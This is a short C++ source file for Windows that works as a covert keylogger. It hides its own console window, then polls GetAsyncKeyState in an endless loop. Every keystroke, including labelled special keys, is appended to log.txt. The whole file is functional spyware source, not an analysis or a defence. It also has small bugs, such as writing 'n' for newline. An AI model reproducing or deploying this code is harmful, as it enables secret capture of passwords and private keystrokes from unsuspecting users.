#include <windows.h>
#include <winuser.h>
#include <conio.h>
#include <iostream>
using namespace std;

//two functions
//1st function will be for saving the file
//2nd function will be for hiding the window
void hidden();
int store(int type,char *data);

int main()
{
	hidden();
	char i;
	while(1)
	{
		for(i=8;i<=190; i++)
		{
			if(GetAsyncKeyState(i)==-32767)
			store(i,"log.txt");
		}
	}
	system("pause");
	return 0;
}



int store(int type, char *data)
{
	if((type==1)||(type==2))
	return 0;
	
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(data, "a+");
	//	ios::app
	cout<<type<<endl;
	
	if(type ==8)
	fprintf(OUTPUT_FILE,"%s","[BACKSPACE]");
	else if(type==13)
	fprintf(OUTPUT_FILE,"%s", "n");
	else if(type==32)
	fprintf(OUTPUT_FILE, "%s", " ");
	else if(type==VK_TAB)
	fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if(type == VK_SHIFT)
	fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if(type == VK_CONTROL)
	fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if(type == VK_ESCAPE)
	fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if(type == VK_END)
	fprintf(OUTPUT_FILE,"%s", "[END]");
	else if(type == VK_HOME)
	fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if(type == VK_LEFT)
	fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if(type == VK_UP)
	fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if(type == VK_RIGHT)
	fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if(type == VK_DOWN)
	fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if(type == 190 || type == 110)
	fprintf(OUTPUT_FILE, "%s", ".");
	else
	fprintf(OUTPUT_FILE,"%s", &type);
	
	fclose(OUTPUT_FILE);
	return 0;
	
}

void hidden()
{
	HWND hidden;
	AllocConsole();
	hidden = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hidden,0);
}
























